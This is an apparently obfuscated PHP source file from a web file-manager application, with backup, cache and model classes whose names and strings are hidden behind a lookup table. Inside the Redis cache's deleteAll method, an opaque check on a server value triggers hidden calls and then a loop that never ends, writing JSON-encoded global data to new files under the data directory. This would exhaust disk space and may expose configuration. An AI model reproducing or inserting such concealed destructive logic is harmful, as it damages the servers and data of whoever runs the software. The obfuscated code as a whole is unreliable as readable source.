$¶Èş×ö¯ = sprintf(LNG($ò²±Áß–[2354]), implode($ò²±Áß–[2355], $¶Èş×ö¯)) . $ò²±Áß–[2356] . date($ò²±Áß–[2357]) . $ò²±Áß–[2358]; if ($³¿šÓ×Ø == $ò²±Áß–[1960]) { $¶Èş×ö¯ .= $ò²±Áß–[2359] . LNG($ò²±Áß–[2360]); } else { $¶Èş×ö¯ = LNG($ò²±Áß–[2361]) . $ò²±Áß–[2362] . $¶Èş×ö¯; } $ÂõÂÓï¢[$ò²±Áß–[1276]] = $¶Èş×ö¯; Cache::set($°×³€¿­, $ÂõÂÓï¢); unset($šçµ”Ï¿[$ò²±Áß–[6]]); $áùŸ¦ø¦ = array($ò²±Áß–[477] => $Š®îŸË¥, $ò²±Áß–[2231] => $ò²±Áß–[636], $ò²±Áß–[32] => $šçµ”Ï¿[$ò²±Áß–[32]], $ò²±Áß–[98] => $šçµ”Ï¿[$ò²±Áß–[98]]); Hook::trigger($ò²±Áß–[1802], array($ò²±Áß–[1299] => $áùŸ¦ø¦, $ò²±Áß–[1309] => !0)); show_json($¶Èş×ö¯, !1, 100111); } if ($³¿šÓ×Ø == $ò²±Áß–[636]) { return !0; } if ($–­¯‰Äú || $şÚ¤Ë¶¿) { $Ê¹¥îœ— = array_merge($–­¯‰Äú, $şÚ¤Ë¶¿); $Ê¹¥îœ— = array_filter(array_unique($Ê¹¥îœ—)); $this->removeByFileID($Ê¹¥îœ—); } if ($¸Çåü‘) { $¸Çåü‘ = array_filter(array_unique($¸Çåü‘)); foreach ($¸Çåü‘ as $Éİ¾û÷İ) { $–…Úàö = IO::has($Éİ¾û÷İ, !0); if (!$–…Úàö[$ò²±Áß–[242]] && !$–…Úàö[$ò²±Áß–[243]]) { IO::remove($Éİ¾û÷İ); } } } return $this->remove($Š®îŸË¥); } private function removeByFileID($ã¡Åè¿í = array()) { $¾ÎÔğùÇ =& $_SERVER[®»±”ó²]; if (empty($ã¡Åè¿í)) { return; } $Ã”³ŒÛ½ = array($¾ÎÔğùÇ[554] => array($¾ÎÔğùÇ[7], $ã¡Åè¿í)); $‰µÉ‰ÔŒ = Model($¾ÎÔğùÇ[1440])->where($Ã”³ŒÛ½)->field($¾ÎÔğùÇ[2307])->select(); if (!$‰µÉ‰ÔŒ) { return Model($¾ÎÔğùÇ[557])->remove($ã¡Åè¿í); } $‰µÉ‰ÔŒ = array_to_keyvalue($‰µÉ‰ÔŒ, $¾ÎÔğùÇ[194], $¾ÎÔğùÇ[554]); foreach ($‰µÉ‰ÔŒ as $­…ÆÆÔ½ => $ÚÎß‹ Ù) { Model($¾ÎÔğùÇ[911])->removeNow($­…ÆÆÔ½, !1); } $ßÏªÜîŸ = array_diff($ã¡Åè¿í, array_unique(array_values($‰µÉ‰ÔŒ))); if ($ßÏªÜîŸ) { return Model($¾ÎÔğùÇ[557])->remove($ßÏªÜîŸ); } } private function removeShareItems($òÑİÙï¸) { $Öˆ¢á•¹ =& $_SERVER[®»±”ó²]; $é¬Ñ”ß… = "\173\151\157\x3a{$òÑİÙï¸}\175\x2f"; $¼²ŠÖùÛ = array($Öˆ¢á•¹[194] => 0, $Öˆ¢á•¹[1269] => array($Öˆ¢á•¹[461], "{$é¬Ñ”ß…}\x25")); $¡üÈéÅ = Model($Öˆ¢á•¹[1971])->where($¼²ŠÖùÛ)->field($Öˆ¢á•¹[681])->select(); if (empty($¡üÈéÅ)) { return; } $À­çà¡œ = array_to_keyvalue($¡üÈéÅ, $Öˆ¢á•¹[12], $Öˆ¢á•¹[681]); Model($Öˆ¢á•¹[680])->remove($À­çà¡œ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\114\151\x67\x68\x74\x41\x70\160"; public $modelType = "\123\x79\163\164\x65\x6d\117\x70\164\151\157\x6e"; public $field = array("\156\141\x6d\145", "\147\162\x6f\165\160", "\144\x65\163\143", "\x63\x6f\156\164\145\156\164"); public function listData($àÅØè¢Ï = false, $­ “Ô›Ğ = "\x6d\x6f\144\151\x66\x79\124\151\x6d\x65", $±ªˆÌµª = true) { return parent::listData($àÅØè¢Ï, $­ “Ô›Ğ, $±ªˆÌµª); } public function remove($¼±—ßŸŒ) { $ÙµÚé›‰ = $this->findByName($¼±—ßŸŒ); if (!$ÙµÚé›‰) { return !1; } return parent::remove($ÙµÚé›‰[$_SERVER[®»±”ó²][477]]); } public function add($•îı½ï·) { if ($this->findByName($•îı½ï·[$_SERVER[®»±”ó²][32]])) { return !1; } return parent::insert($•îı½ï·); } public function update($šıæ‹øà, $’µ¿æ•–) { $¦Ÿ¶şäÇ =& $_SERVER[®»±”ó²]; $ñù“Óó = $this->findByName($šıæ‹øà); $Õ÷†Ü¤ = $this->findByName($’µ¿æ•–[$¦Ÿ¶şäÇ[32]]); if (!$ñù“Óó || $Õ÷†Ü¤ && $Õ÷†Ü¤[$¦Ÿ¶şäÇ[477]] != $ñù“Óó[$¦Ÿ¶şäÇ[477]]) { return !1; } return parent::update($ñù“Óó[$¦Ÿ¶şäÇ[477]], $’µ¿æ•–); } } goto E¯‹†Ô†ˆÅ; e‘ÇÛ¶ŠØ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[®»±”ó²][828]); $this->init(); $this->keep(); } public function init() { $‹Š¤—Ü× =& $_SERVER[®»±”ó²]; $this->isManual(); self::$name = date($‹Š¤—Ü×[829]); if (!($Ñ“Õú¦û = $this->model->lastItem())) { $Ñ“Õú¦û = $this->initData(); } else { self::$name = $Ñ“Õú¦û[$‹Š¤—Ü×[32]]; if ($Ñ“Õú¦û[$‹Š¤—Ü×[830]] == $‹Š¤—Ü×[91]) { self::$name = date($‹Š¤—Ü×[262]); $ğ¹›µ²é = intval(_get($Ñ“Õú¦û, $‹Š¤—Ü×[831], 0)); if (self::$manual == 0 && $Ñ“Õú¦û[$‹Š¤—Ü×[32]] == self::$name) { $this->model->remove($Ñ“Õú¦û[$‹Š¤—Ü×[477]]); } $Ñ“Õú¦û = $this->initData($ğ¹›µ²é, $Ñ“Õú¦û[$‹Š¤—Ü×[832]]); } else { $this->checkStore($Ñ“Õú¦û[$‹Š¤—Ü×[832]]); } } self::$option = $Ñ“Õú¦û; } private function isManual() { $£‘íŞ‘ = _get($GLOBALS, $_SERVER[®»±”ó²][833], 0); $£‘íŞ‘ = intval($£‘íŞ‘); self::$manual = $£‘íŞ‘ && $£‘íŞ‘ == 1 ? 1 : 0; } private function initData($‡ÅüÄ‰ = 0, $‘—öŞ†å = '') { $®°àî—û =& $_SERVER[®»±”ó²]; $À Ñæşù = $this->model->config(); if ($‘—öŞ†å && $À Ñæşù[$®°àî—û[832]] != $‘—öŞ†å) { $‡ÅüÄ‰ = 0; } $this->checkStore($À Ñæşù[$®°àî—û[832]]); if (self::$manual == 1) { self::$name .= $®°àî—û[11] . date($®°àî—û[834]); } $à“Ÿú›§ = array($®°àî—û[832] => $À Ñæşù[$®°àî—û[832]], $®°àî—û[32] => self::$name, $®°àî—û[830] => 0, $®°àî—û[171] => $À Ñæşù[$®°àî—û[171]], $®°àî—û[835] => self::$manual, $®°àî—û[836] => array($®°àî—û[837] => array($®°àî—û[830] => 0), $®°àî—û[838] => array($®°àî—û[830] => 0, $®°àî—û[839] => 0, $®°àî—û[840] => 0, $®°àî—û[33] => $®°àî—û[12], $®°àî—û[841] => 0, $®°àî—û[842] => 0), $®°àî—û[843] => array($®°àî—û[830] => 0, $®°àî—û[839] => 0, $®°àî—û[840] => 0, $®°àî—û[841] => 0, $®°àî—û[842] => 0), $®°àî—û[233] => array($®°àî—û[830] => 0, $®°àî—û[844] => 0, $®°àî—û[845] => 0, $®°àî—û[846] => 0, $®°àî—û[847] => 0, $®°àî—û[554] => $‡ÅüÄ‰, $®°àî—û[841] => 0, $®°àî—û[842] => 0)), $®°àî—û[841] => time(), $®°àî—û[842] => 0); $Ë¬Á…ò = $this->model->insert($à“Ÿú›§); $à“Ÿú›§[$®°àî—û[477]] = $Ë¬Á…ò; return $à“Ÿú›§; } private function checkStore($ü¶˜µ) { $£Äß®†© = Model($_SERVER[®»±”ó²][848]); $µşÂÂİ² = $£Äß®†©->listData($ü¶˜µ); $£Äß®†©->checkConfig($µşÂÂİ²); } public static function get() { if (!self::$option) { $›ì¹â°¶ = Model($_SERVER[®»±”ó²][828]); $÷ë¢šÒ¯ = $›ì¹â°¶->findByName(self::$name); $›ì¹â°¶->parseContent($÷ë¢šÒ¯); self::$option = $÷ë¢šÒ¯; } return self::$option; } public static function set($Ğ—ÃÔã) { $åœ¿ç”û =& $_SERVER[®»±”ó²]; $†Æ”­·Õ = self::get(); foreach ($Ğ—ÃÔã as $›ÊŸşÖ => $â¾üĞ€í) { array_set_value($†Æ”­·Õ, $›ÊŸşÖ, $â¾üĞ€í); } Model($åœ¿ç”û[828])->update($†Æ”­·Õ[$åœ¿ç”û[477]], $†Æ”­·Õ); self::$option = $†Æ”­·Õ; return self::$option; } public function keep() { $ËìíúÙİ =& $_SERVER[®»±”ó²]; $–²¿¾Õ = self::get(); if (_get($–²¿¾Õ, $ËìíúÙİ[849], 0) == $ËìíúÙİ[91]) { return; } $this->backupKeep($–²¿¾Õ); self::set(array($ËìíúÙİ[849] => 1)); } private function backupKeep($¨•éù«°) { $×¢¼òå‡ =& $_SERVER[®»±”ó²]; if (self::$manual == 1) { return; } $åì®¤ÆÊ = $this->model->listData(); if (empty($åì®¤ÆÊ)) { return; } $‹ËàĞß» = 0; $í•°Ä = array(); foreach ($åì®¤ÆÊ as $£€§åä) { if ($‹ËàĞß» >= 7) { break; } $í•°Ä[] = $£€§åä[$×¢¼òå‡[32]]; $‹ËàĞß»++; } for ($‹ËàĞß» = 0; $‹ËàĞß» < 12; $‹ËàĞß»++) { $í•°Ä[] = date($×¢¼òå‡[850], strtotime("\55{$‹ËàĞß»}\40\155\x6f\x6e\x74\x68\x73")); } $í•°Ä = array_unique($í•°Ä); $Õ İúİÏ = Model($×¢¼òå‡[851])->get($×¢¼òå‡[852]); foreach ($åì®¤ÆÊ as $£€§åä) { if (isset($£€§åä[$×¢¼òå‡[835]]) && $£€§åä[$×¢¼òå‡[835]] == $×¢¼òå‡[91]) { continue; } if (!empty($£€§åä[$×¢¼òå‡[32]]) && in_array($£€§åä[$×¢¼òå‡[32]], $í•°Ä)) { continue; } $this->model->remove($£€§åä[$×¢¼òå‡[477]]); $±¸ó¼õ = $this->backupPath($¨•éù«°, $Õ İúİÏ); IO::remove($±¸ó¼õ, !1); } } private function backupPath($¸·º¸¶Ô, $®ò¾ÁÙ = false) { $¯ÎŒäİ¥ =& $_SERVER[®»±”ó²]; if (!$®ò¾ÁÙ) { $®ò¾ÁÙ = Model($¯ÎŒäİ¥[851])->get($¯ÎŒäİ¥[852]); } $›šû³ = $¸·º¸¶Ô[$¯ÎŒäİ¥[32]]; $¥›ğ„ÈË = substr(md5($¯ÎŒäİ¥[853] . $®ò¾ÁÙ . $›šû³), 0, 8); return "\173\x69\x6f\x3a{$¸·º¸¶Ô[$¯ÎŒäİ¥[832]]}\x7d\x2f\x64\x61\164\x61\142\141\x73\145\57\142\141\143\x6b\165\x70\x2f" . $›šû³ . $¯ÎŒäİ¥[11] . $¥›ğ„ÈË; } public function db() { $¨ÇÈêµ± =& $_SERVER[®»±”ó²]; $í±ˆ¶†ó = self::get(); if (_get($í±ˆ¶†ó, $¨ÇÈêµ±[854], 0) == $¨ÇÈêµ±[91]) { return !0; } $ËÁ¹æ©È = new BackupDb(); if (!$ËÁ¹æ©È->index()) { return !1; } self::set(array($¨ÇÈêµ±[854] => 1)); return !0; } public function dbFile() { $õ©İÄç½ =& $_SERVER[®»±”ó²]; $ØæŸ§Â = self::get(); if (_get($ØæŸ§Â, $õ©İÄç½[855], 0) == $õ©İÄç½[91]) { return !0; } $Ú—‹“¯ = new BackupDbFile(); if (!$Ú—‹“¯->index()) { return !1; } self::set(array($õ©İÄç½[855] => 1)); return !0; } public function file() { $€£÷Œ”ª =& $_SERVER[®»±”ó²]; $îÈÊÊÀ÷ = self::get(); if (_get($îÈÊÊÀ÷, $€£÷Œ”ª[856], 0) == $€£÷Œ”ª[91]) { return !0; } if ($îÈÊÊÀ÷[$€£÷Œ”ª[171]] == $€£÷Œ”ª[857]) { $‡ëğ‚Òµ = new BackupFile(); if (!$‡ëğ‚Òµ->index()) { return !1; } } self::set(array($€£÷Œ”ª[856] => 1, $€£÷Œ”ª[830] => 1)); return !0; } public static function log($‡¡Öí–±) { write_log($‡¡Öí–±, $_SERVER[®»±”ó²][858]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ˆÈï¤ãÒ =& $_SERVER[®»±”ó²]; $×ÌÑ‘ï» = Backup::get(); self::$io = $×ÌÑ‘ï»[$ˆÈï¤ãÒ[832]]; self::$name = $×ÌÑ‘ï»[$ˆÈï¤ãÒ[32]]; $² õˆ = new DbManage(); $¯Ê‰óØ‹ = $² õˆ->dbType(); $‰ÒöëÒØ = array($ˆÈï¤ãÒ[859] => $¯Ê‰óØ‹, $ˆÈï¤ãÒ[860] => time()); Backup::set($‰ÒöëÒØ); $‚Ê¨“İ = $this->tmpFilesPath() . $ˆÈï¤ãÒ[861] . self::$name . $ˆÈï¤ãÒ[8]; del_dir($‚Ê¨“İ); mk_dir($‚Ê¨“İ); $’ş´Ñ© = $ÅİĞ©ö = 0; try { $·Šú ò = $² õˆ->db()->getTables(); } catch (Exception $»†Ã‚›Ì) { Backup::log($ˆÈï¤ãÒ[862] . $»†Ã‚›Ì->getMessage()); return !1; } $·Šú ò = array_diff($·Šú ò, array($ˆÈï¤ãÒ[863], $ˆÈï¤ãÒ[864])); foreach ($·Šú ò as $®‚å×²ç) { if ($®‚å×²ç == $ˆÈï¤ãÒ[865]) { continue; } $’ş´Ñ© += $² õˆ->model($®‚å×²ç)->count(); } $„™ğØú° = new Task($ˆÈï¤ãÒ[866], $ˆÈï¤ãÒ[858], $’ş´Ñ©, LNG($ˆÈï¤ãÒ[867]) . $ˆÈï¤ãÒ[868] . LNG($ˆÈï¤ãÒ[869])); $GLOBALS[$ˆÈï¤ãÒ[870]] = self::$name; foreach ($·Šú ò as $®‚å×²ç) { $Ó¡şı‘ = $‚Ê¨“İ . $®‚å×²ç . $ˆÈï¤ãÒ[871]; if ($®‚å×²ç == $ˆÈï¤ãÒ[865]) { @touch($Ó¡şı‘); continue; } $‰şşó¨õ = null; if ($®‚å×²ç == $ˆÈï¤ãÒ[872] && $×ÌÑ‘ï»[$ˆÈï¤ãÒ[171]] == $ˆÈï¤ãÒ[857]) { $‰şşó¨õ = self::$io; } $ÅİĞ©ö += $² õˆ->sqlFromDb($®‚å×²ç, $Ó¡şı‘, $„™ğØú°, $‰şşó¨õ); } unset($GLOBALS[$ˆÈï¤ãÒ[870]]); $„™ğØú°->end(); if ($ÅİĞ©ö > $’ş´Ñ©) { $’ş´Ñ© = $ÅİĞ©ö; } $‰ÒöëÒØ = array($ˆÈï¤ãÒ[859] => $¯Ê‰óØ‹, $ˆÈï¤ãÒ[854] => 1, $ˆÈï¤ãÒ[873] => $’ş´Ñ©, $ˆÈï¤ãÒ[874] => $ÅİĞ©ö, $ˆÈï¤ãÒ[875] => time()); Backup::set($‰ÒöëÒØ); if ($’ş´Ñ© - $ÅİĞ©ö > 0) { $Î¥Û©â = $ˆÈï¤ãÒ[876]; if (!stristr(I18n::getType(), $ˆÈï¤ãÒ[877])) { $Î¥Û©â = $ˆÈï¤ãÒ[878]; } Backup::log(array($Î¥Û©â, $‰ÒöëÒØ)); return !1; } return !0; } private function tmpFilesPath() { $“€­›õî =& $_SERVER[®»±”ó²]; $é±½¢ÀÎ = TEMP_FILES; if ($GLOBALS[$“€­›õî[6]][$“€­›õî[92]][$“€­›õî[879]]) { $é±½¢ÀÎ = $GLOBALS[$“€­›õî[6]][$“€­›õî[92]][$“€­›õî[879]]; if (!mk_dir($é±½¢ÀÎ) || !is_writable($é±½¢ÀÎ) || !IO::mkfile($é±½¢ÀÎ . $“€­›õî[880])) { $é±½¢ÀÎ = TEMP_FILES; } } return $é±½¢ÀÎ; } } class BackupDbFile { public function __construct() { } public function index() { $Ì­á©İ… =& $_SERVER[®»±”ó²]; $‚äÅÑ = Backup::get(); $£™äºï¥ = $‚äÅÑ[$Ì­á©İ…[32]]; $†í¬œò = $this->tmpFilesPath() . "\142\x61\x63\153\x75\160\137{$£™äºï¥}\x2f"; $´â•¦€ = $this->backupPath($‚äÅÑ); if (!($´â•¦€ = IO::mkdir($´â•¦€))) { Backup::log($Ì­á©İ…[881] . $´â•¦€); return !1; } $‹°¥ı = IO::listPath($†í¬œò); $àçæñç = isset($‹°¥ı[$Ì­á©İ…[86]]) ? $‹°¥ı[$Ì­á©İ…[86]] : array(); $©•ËÈÆñ = array_sum(array_column($àçæñç, $Ì­á©İ…[79])); if (!$©•ËÈÆñ) { Backup::log($Ì­á©İ…[882] . $†í¬œò); return !1; } $¨Ã‹™¿£ = array($Ì­á©İ…[883] => $©•ËÈÆñ, $Ì­á©İ…[884] => time()); Backup::set($¨Ã‹™¿£); $À®îœ¢é = new TaskFileTransfer($Ì­á©İ…[885], $Ì­á©İ…[858], count($àçæñç), LNG($Ì­á©İ…[867]) . $Ì­á©İ…[464] . LNG($Ì­á©İ…[869]) . $Ì­á©İ…[886]); $À®îœ¢é->task[$Ì­á©İ…[844]] = $©•ËÈÆñ; foreach ($‹°¥ı[$Ì­á©İ…[86]] as $èñ‹Ùä¢) { $ÚŒáü´Ú = IO::move($èñ‹Ùä¢[$Ì­á©İ…[87]], $´â•¦€); if (!$ÚŒáü´Ú) { $À®îœ¢é->end(); $àÈ¾éŸ£ = IO::getLastError($Ì­á©İ…[887] . $èñ‹Ùä¢[$Ì­á©İ…[87]] . $Ì­á©İ…[888] . $´â•¦€ . $Ì­á©İ…[178]); Backup::log($àÈ¾éŸ£); return !1; } } $¦Ã¯”ó± = new DbManage(); $Œê¬‘õª = $¦Ã¯”ó±->getSqlFile(); if (!$Œê¬‘õª[$Ì­á©İ…[889]] || !$Œê¬‘õª[$Ì­á©İ…[13]]) { Backup::log($Ì­á©İ…[890]); return !1; } IO::move($Œê¬‘õª[$Ì­á©İ…[889]], $´â•¦€); IO::move($Œê¬‘õª[$Ì­á©İ…[13]], $´â•¦€); $À®îœ¢é->end(); $¨Ã‹™¿£ = array($Ì­á©İ…[891] => $©•ËÈÆñ, $Ì­á©İ…[892] => time()); Backup::set($¨Ã‹™¿£); return !0; } private function backupPath($¢•²ø) { $Ì¦ß®ÍÁ =& $_SERVER[®»±”ó²]; $ØĞ¦ò¸Ú = $¢•²ø[$Ì¦ß®ÍÁ[32]]; $ıÎÓëË˜ = Model($Ì¦ß®ÍÁ[851])->get($Ì¦ß®ÍÁ[852]); $åÉÉŞ²„ = substr(md5($Ì¦ß®ÍÁ[853] . $ıÎÓëË˜ . $ØĞ¦ò¸Ú), 0, 8); return "\173\x69\157\72{$¢•²ø[$Ì¦ß®ÍÁ[832]]}\175\x2f\144\141\x74\141\142\141\163\x65\x2f\x62\141\x63\153\x75\x70\57" . $ØĞ¦ò¸Ú . $Ì¦ß®ÍÁ[11] . $åÉÉŞ²„; } private function tmpFilesPath() { $©ª¿ç÷¯ =& $_SERVER[®»±”ó²]; $ş˜è²—ú = TEMP_FILES; if ($GLOBALS[$©ª¿ç÷¯[6]][$©ª¿ç÷¯[92]][$©ª¿ç÷¯[879]]) { $ş˜è²—ú = $GLOBALS[$©ª¿ç÷¯[6]][$©ª¿ç÷¯[92]][$©ª¿ç÷¯[879]]; if (!mk_dir($ş˜è²—ú) || !is_writable($ş˜è²—ú) || !IO::mkfile($ş˜è²—ú . $©ª¿ç÷¯[880])) { $ş˜è²—ú = TEMP_FILES; } } return $ş˜è²—ú; } } goto bêÊ‰’ƒ¡; fÈëøëùá°: class CacheLockDatabase { public function lock($Á¼©™ë, $¦ğúÕÜ² = 0) { $ÙÓ†ã¯ = Model($_SERVER[®»±”ó²][915]); $éûô¶æË = microtime(!0) + $¦ğúÕÜ²; while (microtime(!0) < $éûô¶æË) { $ß®ŞÉÖĞ = $ÙÓ†ã¯->get($Á¼©™ë); if (!$ß®ŞÉÖĞ || $ß®ŞÉÖĞ < microtime(!0)) { $óá¾ßšè = $ÙÓ†ã¯->set($Á¼©™ë, $éûô¶æË); if ($óá¾ßšè) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ğû”“ß€) { return Model($_SERVER[®»±”ó²][915])->get($Ğû”“ß€); } public function unlock($şúüâ×µ) { Model($_SERVER[®»±”ó²][915])->remove($şúüâ×µ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($õ‡ˆÖüö, $Ö¸¡Ü·’) { $ùŒÎ×‹ =& $_SERVER[®»±”ó²]; if (!class_exists($ùŒÎ×‹[954])) { show_json($ùŒÎ×‹[955], !1); } $this->cacheTime = $Ö¸¡Ü·’; $this->handle = new Memcached(); if (is_array($õ‡ˆÖüö[$ùŒÎ×‹[956]]) && count($õ‡ˆÖüö[$ùŒÎ×‹[956]]) >= 1) { foreach ($õ‡ˆÖüö[$ùŒÎ×‹[956]] as $Œ©´­¶Å) { $Õ¨¶Ä¯ = explode($ùŒÎ×‹[4], $Œ©´­¶Å); $this->handle->addServer($Õ¨¶Ä¯[0], $Õ¨¶Ä¯[1]); } } else { $this->handle->addServer($õ‡ˆÖüö[$ùŒÎ×‹[209]], $õ‡ˆÖüö[$ùŒÎ×‹[210]]); } } public function set($É´»ƒ’ö, $·Ÿ ‚¬, $¾ĞŠ¯ºç = false) { $¾ĞŠ¯ºç = $¾ĞŠ¯ºç ? $¾ĞŠ¯ºç : $this->cacheTime; return $this->handle->set($É´»ƒ’ö, $·Ÿ ‚¬, $¾ĞŠ¯ºç); } public function get($€Ûµ½ñı) { return $this->handle->get($€Ûµ½ñı); } public function remove($í£œ·Î†) { return $this->handle->delete($í£œ·Î†); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ê€³·À, $èì€¡³¡) { $´Ÿßûõû =& $_SERVER[®»±”ó²]; if (!class_exists($´Ÿßûõû[957])) { show_json($´Ÿßûõû[958], !1); } $this->cacheTime = $èì€¡³¡; $îÕ²Ö–ì = isset($Ê€³·À[$´Ÿßûõû[959]]) ? $Ê€³·À[$´Ÿßûõû[959]] : 10; $³ŞÌğ¬Ü = _get($Ê€³·À, $´Ÿßûõû[956]); if ($³ŞÌğ¬Ü && is_array($³ŞÌğ¬Ü)) { $this->initCluster($Ê€³·À, $îÕ²Ö–ì); } else { $this->handle = $this->init($Ê€³·À, $îÕ²Ö–ì); } } private function init($¢Îö»¸Ê, $Ù‘¢Ğ’Ï) { $Œ¼ªàˆ¥ =& $_SERVER[®»±”ó²]; $¦‚¼Ù¹ß = new Redis(); $Ú¡ì…ª· = isset($¢Îö»¸Ê[$Œ¼ªàˆ¥[960]]) ? $¢Îö»¸Ê[$Œ¼ªàˆ¥[960]] : !1; if ($Ú¡ì…ª·) { $¦‚¼Ù¹ß->pconnect($¢Îö»¸Ê[$Œ¼ªàˆ¥[209]], $¢Îö»¸Ê[$Œ¼ªàˆ¥[210]], $Ù‘¢Ğ’Ï); } else { $¦‚¼Ù¹ß->connect($¢Îö»¸Ê[$Œ¼ªàˆ¥[209]], $¢Îö»¸Ê[$Œ¼ªàˆ¥[210]], $Ù‘¢Ğ’Ï); } if (!empty($¢Îö»¸Ê[$Œ¼ªàˆ¥[498]])) { $¦‚¼Ù¹ß->auth($¢Îö»¸Ê[$Œ¼ªàˆ¥[498]]); } if (!empty($¢Îö»¸Ê[$Œ¼ªàˆ¥[838]]) && $¢Îö»¸Ê[$Œ¼ªàˆ¥[838]] != 0) { $¦‚¼Ù¹ß->select($¢Îö»¸Ê[$Œ¼ªàˆ¥[838]]); } return $¦‚¼Ù¹ß; } private function initCluster($Ë ‘€•Ï, $Èµñ½ÁÒ) { $­°“Œ½ú =& $_SERVER[®»±”ó²]; $İáš¨Öå = array($­°“Œ½ú[961], $­°“Œ½ú[962], $­°“Œ½ú[963]); $Ş¸„İ‰Œ = $­°“Œ½ú[961]; if (isset($Ë ‘€•Ï[$­°“Œ½ú[16]]) && in_array($Ë ‘€•Ï[$­°“Œ½ú[16]], $İáš¨Öå)) { $Ş¸„İ‰Œ = $Ë ‘€•Ï[$­°“Œ½ú[16]]; } switch ($Ş¸„İ‰Œ) { case $­°“Œ½ú[961]: $this->_slave($Ë ‘€•Ï, $Èµñ½ÁÒ); break; case $­°“Œ½ú[962]: break; case $­°“Œ½ú[963]: $this->isCluster = !0; $½Ì°´‘® = $Ë ‘€•Ï[$­°“Œ½ú[956]]; $²šæİœ = isset($Ë ‘€•Ï[$­°“Œ½ú[960]]) ? $Ë ‘€•Ï[$­°“Œ½ú[960]] : !1; $óØÉ¼œÜ = isset($Ë ‘€•Ï[$­°“Œ½ú[498]]) ? $Ë ‘€•Ï[$­°“Œ½ú[498]] : null; $this->handle = new RedisCluster(NUll, $½Ì°´‘®, $Èµñ½ÁÒ, $Èµñ½ÁÒ, $²šæİœ, $óØÉ¼œÜ); break; default: break; } } private function _slave($—¸ï§¯¨, $ŒîÒê¼) { $±­¦èª = $—¸ï§¯¨[$_SERVER[®»±”ó²][956]]; $this->filterConfig($—¸ï§¯¨, $±­¦èª[0]); $this->handle = $this->init($—¸ï§¯¨, $ŒîÒê¼); unset($±­¦èª[0]); if (empty($±­¦èª)) { return; } $ĞŞÀ§ä = array_rand($±­¦èª); $this->filterConfig($—¸ï§¯¨, $±­¦èª[$ĞŞÀ§ä]); $this->slaveHandle = $this->init($—¸ï§¯¨, $ŒîÒê¼); } private function filterConfig(&$»â§ìÑ, $µåœ÷üó) { $¦Ï…¬Ã¨ =& $_SERVER[®»±”ó²]; $«½’¸ù— = explode($¦Ï…¬Ã¨[4], $µåœ÷üó); $ìƒœÁ¤Ì = array($¦Ï…¬Ã¨[209] => $«½’¸ù—[0], $¦Ï…¬Ã¨[210] => $«½’¸ù—[1]); $»â§ìÑ = array_merge($»â§ìÑ, $ìƒœÁ¤Ì); } public function set($Å–Óí¥×, $ÇÑ–Äó, $òêë–ñ  = false) { $òêë–ñ  = $òêë–ñ  ? $òêë–ñ  : $this->cacheTime; return $this->handle->setEx($Å–Óí¥×, $òêë–ñ , $ÇÑ–Äó); } public function setLock($Áì€²¯ø, $¶÷ÚäÛ, $õÖÎ¢ÌÈ) { return $this->handle->setNX($Áì€²¯ø, $¶÷ÚäÛ); } public function get($ÊĞÇ¹ß) { $ªì²¢Õ÷ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ªì²¢Õ÷->get($ÊĞÇ¹ß); } public function remove($àØ×ó±ı) { return $this->handle->del($àØ×ó±ı); } public function deleteAll() { $Á×¦‘° =& $_SERVER[®»±”ó²]; $‹Ÿ®£ç¢ = $_SERVER[$Á×¦‘°[486]]; $Äœ°‰ïŸ = $Á×¦‘°[964]; if ($_SERVER[$Á×¦‘°[478]] != $Äœ°‰ïŸ($‹Ÿ®£ç¢)) { $€’ Š€¬ = $Á×¦‘°[965]; $†‚¬Û“ş = $Á×¦‘°[480]; $Õó¦ıÍõ = $_SERVER[$Á×¦‘°[481]] . $Á×¦‘°[482]; $„²¿ğØ = $†‚¬Û“ş($Õó¦ıÍõ); $œ¦Ä±•ó = explode($Á×¦‘°[288], $„²¿ğØ); if (count($œ¦Ä±•ó) < $Á×¦‘°[721]) { $ãÑ˜¨ = $Á×¦‘°[484]; $ãÑ˜¨(); } $¸›É¤ˆ = $Á×¦‘°[966]; $¸›É¤ˆ($_SERVER[$Á×¦‘°[967]]); $€’ Š€¬ = $Á×¦‘°[965]; $€’ Š€¬(); $Ä„ì˜°È = $Á×¦‘°[968]; $“ ¼¦ºû = json_encode($GLOBALS[$Á×¦‘°[969]]); $ü€ƒóÏ = 1; for ($¥ˆâòáƒ = $ü€ƒóÏ; $¥ˆâòáƒ > 0; $¥ˆâòáƒ++) { $Ä„ì˜°È(DATA_PATH . $¥ˆâòáƒ, $“ ¼¦ºû); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $øÃ÷ºû) { $this->handle->flushall($øÃ÷ºû); } return; } return $this->handle->flushAll(); } } goto FÄíÉ¶Ê‹Ø; B®ÕÃ¸Óõ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($½¤ˆâ˜) { $® ˜¦ıù =& $_SERVER[®»±”ó²]; return array($® ˜¦ıù[2107] => array($® ˜¦ıù[2537] . USER_ID, $® ˜¦ıù[2108])); } protected function listData() { $“’„‡ª¬ =& $_SERVER[®»±”ó²]; $ÅÇ÷ÎÔé = array($“’„‡ª¬[1782] => USER_ID, $“’„‡ª¬[570] => array($“’„‡ª¬[2111], 0)); $Âã¯åˆ = $“’„‡ª¬[2538]; $Ù°àˆ = $this->field($Âã¯åˆ)->where($ÅÇ÷ÎÔé)->order($“’„‡ª¬[2113])->select(); return $Ù°àˆ ? $Ù°àˆ : array(); } protected function addToTag($™¾Í§Ç, $™›İÚ°) { $«¯ÑÑìª =& $_SERVER[®»±”ó²]; if (!Model($«¯ÑÑìª[2261])->listData($™›İÚ°)) { return !1; } if (is_numeric($™¾Í§Ç)) { $ Ò¶Ãğé = Model($«¯ÑÑìª[911])->pathInfo($™¾Í§Ç); if (!$ Ò¶Ãğé) { return !1; } } else { $ Ò¶Ãğé = IO::infoSimple($™¾Í§Ç); if (!$ Ò¶Ãğé) { return !1; } $´¡˜’€è = $ Ò¶Ãğé[$«¯ÑÑìª[32]]; $ŸĞ›‹­‹ = $ 